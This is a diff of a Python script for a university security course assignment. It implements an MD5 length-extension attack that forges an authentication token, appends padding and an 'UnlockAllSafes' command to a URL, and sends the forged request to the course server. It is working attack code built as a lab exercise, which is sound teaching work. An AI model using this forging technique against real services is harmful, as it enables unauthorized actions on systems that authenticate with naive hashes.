@@ -1,69 +1,66 @@
 __doc__ = """
     EECS 388 project 1
     len_ext_attack.py
-
 """
 
 import httplib, urlparse, sys, urllib
 from pymd5 import md5, padding
 
-# put functions here
 
-# this is needed if we want to use this as a lib at some point
-if __name__ == "__main__":
+def len_ext_attack( url, command_to_add, user_password_length):
 
-    # the command we are trying run
-    command_to_add = "UnlockAllSafes"
-    user_password_length = 8
+    """
 
-    # TODO get rid of this hard code for submit
-    # only here to run in pyCharm with out error
-
-    url = """http://eecs388.org/project1/api?token=a1913e8031748f7a5dbd070125bd1cd1&user=admin&command1=ListFiles&command2=NoOp"""
-
-    if len( sys.argv ) > 1:
-        url = sys.argv[1]
-
-    print "Input URL:"
-    print url
-
-    # use quote to get rid of any special characters and put it in the right form
-    #urllib.quote( url )
-
+    :rtype : void
+    """
     # Parse the URL and get the current session token
     parsedUrl = urlparse.urlparse( url )
     parameters = dict(urlparse.parse_qsl( parsedUrl.query ))
 
+    # parse the command
+    command_to_add = "&command" + str(len(parameters)) + "=" + command_to_add
 
-
-    #
-    if "token" in parameters:
-        session_token = parameters["token"]
-        del parameters["token"]
-        print "Parameters are:"
-        print parameters
-    else:
+    if "token" not in parameters:
         # if there isn't a token in the parameters quit the program
         print "There is no token in the url parameters"
         assert False
 
-    length_of_message_with_password = len(urllib.urlencode( parameters )) + 8
-    bits = length_of_message_with_password + len( padding(length_of_message_with_password*8)) * 8
+    #remove the session token from the current parameters
+    session_token = parameters["token"]
+    del parameters["token"]
 
+    length_of_message_with_password = len(urllib.urlencode( parameters )) + user_password_length
+    bits = (length_of_message_with_password + len(padding(length_of_message_with_password*8)))*8
 
-    # TODO is the count the same as the length? I think so
-    hash_object = md5(state=(session_token.decode("hex")), count=length_of_message_with_password)
+    h = md5(state=session_token.decode("hex"), count=bits)
+    #h.update(padding(length_of_message_with_password * 8 ))
+    h.update( command_to_add )
 
-    #hash_object.update( command_to_add )
-    print hash_object.digest()
+    #build the query
+    parameters_list = urlparse.parse_qsl( parsedUrl.query )
 
-    #md5( state=url, count= )
-    # Your code to modify url goes here
+    query = "token=" + h.hexdigest()
+
+    for x in range(1, len(parameters_list)):
+        query += "&" + parameters_list[x][0] + "=" + parameters_list[x][1]
+
+    query += urllib.quote( padding(length_of_message_with_password * 8 ) )
+    query += command_to_add
 
     conn = httplib.HTTPConnection(parsedUrl.hostname, parsedUrl.port)
-    conn.request("GET", parsedUrl.path + "?" + parsedUrl.query )
-
-    print "Connection response"
+    print parsedUrl.path + "?" + query
+    conn.request("GET", parsedUrl.path + "?" + query )
     print conn.getresponse().read()
 
 
+
+if __name__ == "__main__":
+
+    # sanitize the user input
+    if len(sys.argv) < 2:
+        print "Need input url"
+        assert False
+
+    url_in = sys.argv[1]
+    print url_in
+    len_ext_attack(url_in, "UnlockAllSafes", 8)
